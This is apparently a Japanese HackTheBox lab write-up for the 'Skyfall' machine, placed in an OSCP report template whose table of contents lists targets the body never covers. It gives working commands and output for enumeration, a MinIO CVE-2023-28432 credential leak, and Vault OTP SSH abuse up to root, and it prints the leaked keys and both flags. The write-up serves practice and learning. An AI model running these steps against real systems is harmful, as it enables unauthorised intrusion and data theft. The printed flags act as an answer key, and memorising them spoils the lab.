OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![[Skyfall image.png]]

Copyright © 2023 OffSec Ltd. All rights reserved.

この出版物のいかなる部分も、その全部または一部を複製、コピー、譲渡、または著作権所有者に留保するその他の権利(コピーおよびその他すべてのコピー、ネットワークまたはその他の通信手段を使用した転送または送信、遠隔学習のための放送を含む)を、情報ストレージなどのいかなる形式または手段によっても、 OffSecからの事前の書面による許可なしに、送信または検索システム。

[1. OffSec OSCP Exam Penetration Test Report    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_gjdgxs)

[1.1 Introduction    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_30j0zll)

[1.2 Objective    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1fob9te)

[1.3 Requirements    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3znysh7)

[2. High-Level Summary    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2et92p0)

[2.1 Recommendations    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_tyjcwt)

[3. Methodologies    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3dy6vkm)

[3.1 Information Gathering    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1t3h5sf)

[3.2 Service Enumeration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4d34og8)

[3.3 Penetration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2s8eyo1)

[3.4 Maintaining Access    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_17dp8vu)

[3.5 House Cleaning    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3rdcrjn)

[4. Independent Challenges    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_26in1rg)

[4.1 Target #1 – 192.168.232.55    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_lnxbz9)

[4.1.1 Service Enumeration    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_35nkun2)

[4.1.2 Initial Access – Anonymous SMB share leads to Wordpress RCE    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ksv4uv)

[5. Active Directory Set    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_44sinio)

[5.1 Ajla – 10.4.4.10    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2jxsxqh)

[5.1.1 Initial Access – Password Brute-Forcing    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_z337ya)

[5.1.2 Privilege Escalation – Sudo group    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3j2qqm3)

[5.1.3 Post-Exploitation    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1y810tw)

[5.2 Poultry – 10.5.5.20    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4i7ojhp)

[5.2.1 Initial Access – RDP login    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2xcytpi)

[5.2.2 Post-Exploitation    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ci93xb)

[5.3 DC – 10.5.5.30    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2bn6wsx)

[5.3.1 Initial Access – Remote Commands Execution    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_qsh70q)

[5.3.2 Post-Exploitation    26](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1pxezwc)

1\. OffSec OSCP 試験ペネトレーション テスト レポート

1.1 はじめに

1.2 目的

1.3 必要条件

2\. ハイレベルなまとめ

3\. メソドロジー

3.1 情報収集

試験ネットワーク:

3.2 サービスの列挙

3.3 浸透

3.4 アクセスの維持

4\. 自主的な課題

4.1ターゲット#1– 10.10.11.254

4.1.1 初期アクセス –

4.1.2 サービス列挙

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.254 | **TCP**: 22,80 |

└─# nmap -p- --min-rate=20000 10.10.11.254

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 07:51 JST

Warning: 10.10.11.254 giving up on port because retransmission cap hit (10).

Nmap scan report for 10.10.11.254

Host is up (0.21s latency).

Not shown: 64647 closed tcp ports (reset), 886 filtered tcp ports (no-response)

PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 33.45 seconds

![[Skyfall image 1.png]]

==🔴ポート====🔴22====🔴番に対するさらなる調査==

└─# nmap -p 22 -sV -sC -A 10.10.11.254

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 08:13 JST

Nmap scan report for 10.10.11.254

Host is up (0.20s latency).

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

\| ssh-hostkey:

\|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)

\|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)

HOP RTT       ADDRESS

1   192.76 ms 10.10.14.1

2   192.68 ms 10.10.11.254

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 44.57 seconds

![[Skyfall image 2.png]]

└─# nmap -p80 -sV -sC -A 10.10.11.254

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 07:52 JST

Nmap scan report for 10.10.11.254

Host is up (0.19s latency).

PORT   STATE SERVICE VERSION

80/tcp open  http    nginx 1.18.0 (Ubuntu)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.0 - 5.5 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)

HOP RTT       ADDRESS

1   198.39 ms 10.10.14.1

2   198.47 ms 10.10.11.254

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 66.15 seconds

![[Skyfall image 3.png]]

Web Access

http://10.10.11.254

![[Skyfall image 4.png]]

ホスト名の登録

└─# echo "10.10.11.254 skyfall.htb" | tee -a /etc/hosts

10.10.11.254 skyfall.htb

![[Skyfall image 5.png]]

ディレクトリ列挙

└─# gobuster dir -u http://10.10.11.254 -w /usr/share/wordlists/dirb/big.txt

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:                     http://10.10.11.254

\[+\] Method:                  GET

\[+\] Threads:                 10

\[+\] Wordlist:                /usr/share/wordlists/dirb/big.txt

\[+\] Negative Status codes:   404

\[+\] User Agent:              gobuster/3.6

\[+\] Timeout:                 10s

\===============================================================

Starting gobuster in directory enumeration mode

\===============================================================

/assets               (Status: 301) \[Size: 178\] \[--> http://10.10.11.254/assets/\]

Progress: 20469 / 20470 (100.00%)

\===============================================================

Finished

\===============================================================

![[Skyfall image 6.png]]

サブドメイン列挙

Vhost列挙

└─# gobuster vhost -u http://skyfall.htb/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --append-domain -r

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:             http://skyfall.htb/

\[+\] Method:          GET

\[+\] Threads:         10

\[+\] Wordlist:        /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt

\[+\] User Agent:      gobuster/3.6

\[+\] Timeout:         10s

\[+\] Append Domain:   true

\===============================================================

Starting gobuster in VHOST enumeration mode

\===============================================================

Progress: 406 / 207644 (0.20%)\[ERROR\] Get "http://demo.skyfall.htb/login": dial tcp: lookup demo.skyfall.htb on 8.8.8.8:53: no such host

Progress: 4541 / 207644 (2.19%)^C

\[!\] Keyboard interrupt detected, terminating.

Progress: 4550 / 207644 (2.19%)

\[ERROR\] could not read body context canceled

\===============================================================

Finished

\===============================================================

![[Skyfall image 7.png]]

名前解決エラーのため登録して再度実行

└─# echo "10.10.11.254 demo.skyfall.htb" | tee -a /etc/hosts

10.10.11.254 demo.skyfall.htb

![[Skyfall image 8.png]]

再度実行

└─# gobuster vhost -u http://skyfall.htb/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --append-domain -r

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:             http://skyfall.htb/

\[+\] Method:          GET

\[+\] Threads:         10

\[+\] Wordlist:        /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt

\[+\] User Agent:      gobuster/3.6

\[+\] Timeout:         10s

\[+\] Append Domain:   true

\===============================================================

Starting gobuster in VHOST enumeration mode

\===============================================================

Found: demo.skyfall.htb Status: 200 \[Size: 3674\]

![[Skyfall image 9.png]]

![[Skyfall image 10.png]]

guest/guestでログイン

![[Skyfall image 11.png]]

http://demo.skyfall.htb/metrics

![[Skyfall image 12.png]]

アクセス権がないとされる

ページのアクセス権のバイパス

0%aをつけて実行

![[Skyfall image 13.png]]

![[Skyfall image 14.png]]

ページの最後で新しいサブドメインを見つけたので再度登録

└─# echo "10.10.11.254 prd23-s3-backend.skyfall.htb" | tee -a /etc/hosts

10.10.11.254 prd23-s3-backend.skyfall.htb

![[Skyfall image 15.png]]

Minioについて

![[Skyfall image 16.png]]

脆弱性に対するPoC

https://github.com/acheiii/CVE-2023-28432

![[Skyfall image 17.png]]

BurpSuiteのRepeaterで実際に試してみると成功しました。

![[Skyfall image 18.png]]

![[Skyfall image 19.png]]

{"MinioEndpoints":\[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":\[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true}\],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}\],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"==🟢GkpjkmiVmpFuL2d3oRx0==","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"==🟢5GrE1B2YGGyZzNHZaIww==","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}

mcバイナリのダウンロード

https://dl.min.io/client/mc/release/linux-amd64/

![[Skyfall image 20.png]]

└─# ./mc alias set myminio http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

Added \`myminio\` successfully.

![[Skyfall image 21.png]]

└─# ./mc ls --recursive --versions myminio

\[2023-11-08 13:59:15 JST\]     0B askyy/

\[2023-11-08 14:35:28 JST\]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf

\[2023-11-10 06:37:25 JST\] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz

\[2023-11-10 06:37:09 JST\] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz

\[2023-11-10 06:36:30 JST\] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz

\[2023-11-08 13:58:56 JST\]     0B btanner/

\[2023-11-08 14:35:36 JST\]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf

\[2023-11-08 13:58:33 JST\]     0B emoneypenny/

\[2023-11-08 14:35:56 JST\]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf

\[2023-11-08 13:58:22 JST\]     0B gmallory/

\[2023-11-08 14:36:02 JST\]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf

\[2023-11-08 09:08:01 JST\]     0B guest/

\[2023-11-08 09:08:05 JST\]  48KiB STANDARD null v1 PUT guest/Welcome.pdf

\[2024-05-10 11:27:32 JST\]  11KiB STANDARD null v1 PUT guest/ava80.png

\[2023-11-08 13:59:05 JST\]     0B jbond/

\[2023-11-08 14:35:45 JST\]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf

\[2023-11-08 13:58:10 JST\]     0B omansfield/

\[2023-11-08 14:36:09 JST\]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf

\[2023-11-08 13:58:45 JST\]     0B rsilva/

\[2023-11-08 14:35:51 JST\]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf

![[Skyfall image 22.png]]

└─# ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz

...me_backup.tar.gz: 2.64 KiB / 2.64 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 1.27 KiB/s 2s

![[Skyfall image 23.png]]

ファイルの解凍

─# tar -xvf home_backup.tar.gz

./

./.profile

./.bashrc

./.ssh/

./.ssh/authorized_keys

./.sudo_as_admin_successful

./.bash_history

./.bash_logout

./.cache/

./.cache/motd.legal-displayed

![[Skyfall image 24.png]]

set a fancy prompt (non-color, unless we know we "want" color)

case "$TERM" in

xterm-color|*-256color) color_prompt=yes;;

esac

export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"

![[Pasted image 20261128145424.png]]

![[Skyfall image 25.png]]

└─# echo "10.10.11.254 prd23-vault-internal.skyfall.htb" | tee -a /etc/hosts

10.10.11.254 prd23-vault-internal.skyfall.htb

![[Skyfall image 26.png]]

vaultのダウンロード

wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip

unzip vault_1.15.5_linux_amd64.zip

![[Skyfall image 27.png]]

![[Skyfall image 28.png]]

![[Skyfall image 29.png]]

![[Skyfall image 30.png]]

![[Skyfall image 31.png]]

![[Skyfall image 32.png]]

4.1.2 初期アクセス –

└─# ./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254

Vault could not locate "sshpass". The OTP code for the session is displayed

below. Enter this code in the SSH password prompt. If you install sshpass,

Vault can automatically perform this step for you.

OTP for the session is: 360a9575-1fe6-5617-7f1f-bf418546a166

(askyy@10.10.11.254) Password:

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

\* Documentation:  https://help.ubuntu.com

\* Management:     https://landscape.canonical.com

\* Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are

not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

askyy@skyfall:~$

![[Skyfall image 33.png]]

![[Skyfall image 34.png]]

Local.txt値:24c5791f36675bb58f79073d0d11d55a

4.1.3 特権エスカレーション -

![[Skyfall image 35.png]]

```
curl --header "X-Vault-Token: $VAULT_TOKEN" --request POST --data '{"ip":"10.10.11.254", "username":"root"}' $VAULT_ADDR/v1/ssh/creds/admin_otp_key_role{"request_id":"b62f86f1-9548-f574-5736-a712b5c35e53","lease_id":"ssh/creds/admin_otp_key_role/5s2n9XHOLbyC6t7NmpSBoVdd","renewable":false,"lease_duration":2764800,"data":{"ip":"10.10.11.254","key":"2d0f3805-51b1-6c04-2e28-ff3440777cb8","key_type":"otp","port":22,"username":"root"},"wrap_info":null,"warnings":null,"auth":null}
```

![[Pasted image 20261128145309.png]]

![[Skyfall image 36.png]]

./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254

![[Skyfall image 37.png]]

4.1.4 エクスプロイト後の処理

Proof.txt値:c40b3af508339e39077bf0a707525a19

![[Skyfall image 38.png]]